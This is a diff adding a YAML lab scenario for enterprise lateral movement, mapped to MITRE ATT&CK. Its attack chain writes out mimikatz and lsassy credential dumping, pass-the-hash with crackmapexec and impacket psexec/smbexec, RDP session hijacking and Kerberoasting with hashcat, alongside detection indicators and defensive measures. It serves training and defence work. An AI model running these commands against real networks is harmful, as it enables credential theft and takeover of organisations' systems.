@@ -1,0 +1,258 @@
+# Lateral Movement Scenario
+# MITRE ATT&CK: T1021 (Remote Services)
+
+scenario:
+  id: "attack-002"
+  name: "Enterprise Network Lateral Movement"
+  description: "Post-exploitation lateral movement through corporate network"
+  difficulty: "advanced"
+  duration_minutes: 45
+
+mitre_attack:
+  tactics:
+    - "TA0008"  # Lateral Movement
+    - "TA0006"  # Credential Access
+    - "TA0007"  # Discovery
+
+  techniques:
+    - id: "T1021.001"
+      name: "Remote Services: Remote Desktop Protocol"
+      tactic: "Lateral Movement"
+
+    - id: "T1021.002"
+      name: "Remote Services: SMB/Windows Admin Shares"
+      tactic: "Lateral Movement"
+
+    - id: "T1550.002"
+      name: "Use Alternate Authentication Material: Pass the Hash"
+      tactic: "Lateral Movement"
+
+    - id: "T1003.001"
+      name: "OS Credential Dumping: LSASS Memory"
+      tactic: "Credential Access"
+
+attack_chain:
+  - step: 1
+    name: "Initial Foothold Credential Harvesting"
+    technique: "T1003.001"
+    description: "Extract credentials from compromised workstation"
+    commands:
+      - tool: "mimikatz"
+        args: |
+          privilege::debug
+          sekurlsa::logonpasswords
+          sekurlsa::tickets /export
+        expected_output: "Credentials and Kerberos tickets extracted"
+
+      - tool: "lsassy"
+        args: "-d {{DOMAIN}} -u {{USER}} -p {{PASS}} {{TARGET_IP}}"
+        expected_output: "NTLM hashes dumped"
+
+    success_criteria:
+      - "Obtained NTLM hashes"
+      - "Extracted Kerberos tickets"
+      - "Found domain admin credentials"
+
+  - step: 2
+    name: "Network Discovery"
+    technique: "T1018"
+    description: "Map internal network and identify high-value targets"
+    commands:
+      - tool: "powershell"
+        args: "Get-ADComputer -Filter * | Select Name,IPv4Address"
+        expected_output: "Active Directory computer list"
+
+      - tool: "crackmapexec"
+        args: "smb {{NETWORK_CIDR}} -u {{USER}} -H {{NTLM_HASH}}"
+        expected_output: "SMB hosts enumerated"
+
+      - tool: "bloodhound"
+        args: "-c All -d {{DOMAIN}}"
+        expected_output: "AD attack paths mapped"
+
+    success_criteria:
+      - "Identified domain controllers"
+      - "Found file servers"
+      - "Mapped privileged accounts"
+
+  - step: 3
+    name: "Pass-the-Hash Attack"
+    technique: "T1550.002"
+    description: "Authenticate to remote systems using NTLM hashes"
+    commands:
+      - tool: "crackmapexec"
+        args: "smb {{TARGET_IP}} -u {{USER}} -H {{NTLM_HASH}} -x whoami"
+        expected_output: "Remote command execution successful"
+
+      - tool: "impacket-psexec"
+        args: "-hashes :{{NTLM_HASH}} {{USER}}@{{TARGET_IP}}"
+        expected_output: "Interactive shell obtained"
+
+    success_criteria:
+      - "Authenticated without password"
+      - "Executed remote commands"
+      - "Established reverse shell"
+
+  - step: 4
+    name: "SMB Admin Share Access"
+    technique: "T1021.002"
+    description: "Access administrative shares for file operations"
+    commands:
+      - tool: "smbclient"
+        args: "//{{TARGET_IP}}/C$ -U {{USER}} --pw-nt-hash {{NTLM_HASH}}"
+        expected_output: "Admin share mounted"
+
+      - tool: "impacket-smbexec"
+        args: "-hashes :{{NTLM_HASH}} {{USER}}@{{TARGET_IP}}"
+        expected_output: "Semi-interactive shell"
+
+    success_criteria:
+      - "Accessed C$ share"
+      - "Read/Write file operations"
+      - "Deployed additional payloads"
+
+  - step: 5
+    name: "RDP Hijacking"
+    technique: "T1021.001"
+    description: "Hijack existing RDP sessions for persistence"
+    commands:
+      - tool: "powershell"
+        args: "query user /server:{{TARGET_IP}}"
+        expected_output: "Active RDP sessions listed"
+
+      - tool: "mimikatz"
+        args: |
+          ts::sessions
+          ts::remote /id:{{SESSION_ID}}
+        expected_output: "RDP session hijacked"
+
+    success_criteria:
+      - "Identified active sessions"
+      - "Hijacked user session"
+      - "Maintained stealth"
+
+  - step: 6
+    name: "Kerberoasting"
+    technique: "T1558.003"
+    description: "Extract and crack service account credentials"
+    commands:
+      - tool: "impacket-GetUserSPNs"
+        args: "{{DOMAIN}}/{{USER}}:{{PASS}} -request"
+        expected_output: "Service tickets obtained"
+
+      - tool: "hashcat"
+        args: "-m 13100 tickets.txt /usr/share/wordlists/rockyou.txt"
+        expected_output: "Service account password cracked"
+
+    success_criteria:
+      - "Extracted TGS tickets"
+      - "Cracked service passwords"
+      - "Obtained privileged credentials"
+
+defense_detection:
+  indicators:
+    - type: "authentication"
+      description: "NTLM authentication from unusual source"
+      pattern: "NTLM auth without password"
+      severity: "HIGH"
+
+    - type: "network"
+      description: "Multiple failed SMB connection attempts"
+      pattern: "SMB access denied from {{ATTACKER_IP}}"
+      severity: "MEDIUM"
+
+    - type: "process"
+      description: "Mimikatz or credential dumping tool execution"
+      pattern: "lsass.exe memory access"
+      severity: "CRITICAL"
+
+    - type: "kerberos"
+      description: "Abnormal TGS ticket requests"
+      pattern: "Multiple TGS-REQ from single host"
+      severity: "HIGH"
+
+    - type: "rdp"
+      description: "RDP session anomaly"
+      pattern: "RDP connection without logon event"
+      severity: "HIGH"
+
+defensive_measures:
+  preventive:
+    - "Implement LAPS (Local Admin Password Solution)"
+    - "Enable Credential Guard"
+    - "Disable NTLM authentication where possible"
+    - "Enforce SMB signing"
+    - "Use Protected Users security group"
+    - "Implement least privilege access"
+
+  detective:
+    - "Monitor for Pass-the-Hash indicators"
+    - "Alert on abnormal Kerberos ticket requests"
+    - "Track lateral movement via Event ID 4624/4648"
+    - "Detect credential dumping tools (LSASS access)"
+    - "Monitor RDP session anomalies"
+
+  responsive:
+    - "Isolate compromised hosts"
+    - "Reset affected account credentials"
+    - "Revoke Kerberos tickets"
+    - "Block lateral movement paths"
+    - "Initiate hunt for persistence mechanisms"
+
+learning_objectives:
+  - "Understand lateral movement techniques"
+  - "Learn credential harvesting methods"
+  - "Practice Pass-the-Hash attacks"
+  - "Master Active Directory enumeration"
+  - "Learn Kerberos attack techniques"
+
+difficulty_modifiers:
+  easy:
+    - "Weak passwords"
+    - "No LAPS deployment"
+    - "SMB signing disabled"
+
+  hard:
+    - "Strong password policy"
+    - "LAPS enabled"
+    - "Credential Guard active"
+    - "Advanced logging enabled"
+    - "EDR solutions deployed"
+
+scoring:
+  max_points: 1500
+  breakdown:
+    credential_harvesting: 300
+    network_discovery: 200
+    pass_the_hash: 300
+    smb_access: 200
+    rdp_hijacking: 300
+    kerberoasting: 200
+
+  stealth_bonus:
+    undetected: 500
+    minimal_alerts: 250
+    moderate_alerts: 100
+
+environment:
+  required_tools:
+    - mimikatz
+    - crackmapexec
+    - impacket-suite
+    - bloodhound
+    - hashcat
+    - powershell
+
+  target_domain:
+    name: "CORP.SYNOS.LOCAL"
+    domain_controllers:
+      - "DC01.corp.synos.local"
+      - "DC02.corp.synos.local"
+    workstations: 50
+    servers: 10
+
+  network:
+    domain_cidr: "10.0.0.0/16"
+    workstation_subnet: "10.0.10.0/24"
+    server_subnet: "10.0.20.0/24"
+    dc_subnet: "10.0.30.0/24"
